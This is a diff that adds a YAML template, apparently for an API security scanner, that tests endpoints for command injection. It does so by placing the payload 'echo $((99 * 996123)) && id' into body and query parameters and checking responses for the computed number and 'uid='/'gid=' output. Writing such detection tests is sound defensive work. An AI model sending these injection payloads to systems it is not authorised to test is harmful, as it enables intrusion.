@@ -1,0 +1,132 @@
+id: COMMAND_INJECTION_MATH_COMPUTE_CHAINED
+info:
+  name: "Command injection with chaining system commands with arithmetic expression execution with echo"
+  description: "Command injection with chaining system commands and arithmetic expression execution using `echo` involves exploiting vulnerabilities to run multiple commands and perform calculations. Attackers can inject commands that use operators like `;` to chain commands and leverage `echo` to display results of arithmetic expressions. This technique allows attackers to execute complex operations, perform calculations, and manipulate the output to gain insights or further compromise the system."
+  details: >
+    "Command injection with chaining and arithmetic expression execution involves injecting commands that combine multiple operations and calculations. For instance, an attacker might use `;` to separate commands and `echo $((expression))` to evaluate arithmetic expressions. By executing such commands, attackers can execute a series of system operations and retrieve calculated results, which can be used to gather information, escalate privileges, or further exploit system vulnerabilities. This approach enables sophisticated attacks by manipulating command execution flow and output."
+  impact: "The impact of command injection with chaining and arithmetic expression execution can be significant, as it allows attackers to perform complex operations and calculations on the target system. This technique can lead to unauthorized access, privilege escalation, or data manipulation by executing multiple commands in sequence. Additionally, attackers can use arithmetic expressions to infer system details or bypass security controls, increasing the potential for further exploitation and compromising the overall security and integrity of the system."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: COMMAND_INJECTION_MATH_COMPUTE_CHAINED
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2023-25826
+    - CVE-2023-41031
+
+attributes:
+  nature: INTRUSIVE
+  plan: STANDARD
+  duration: FAST
+
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  or:
+    - request_payload:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_body_key
+          value:
+            extract: changed_body_value
+    - query_param:
+        for_one:
+          key:
+            regex: .*
+            extract: changed_query_key
+          value:
+            regex: .*
+            extract: changed_query_value
+wordLists:
+  specialOSPayloads:
+    - "echo $((99 * 996123)) && id"
+execute:
+  type: single
+  requests:
+    - req:
+        - modify_body_param:
+            changed_body_key: ${specialOSPayloads}
+        - modify_query_param:
+            changed_query_key: ${specialOSPayloads}
+validate:
+  response_payload:
+    length:
+      gt: 0
+    contains_all:
+      - "98616177"
+      - "uid="
+      - "gid="
+      - "groups="
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - </html>
+      - <html>
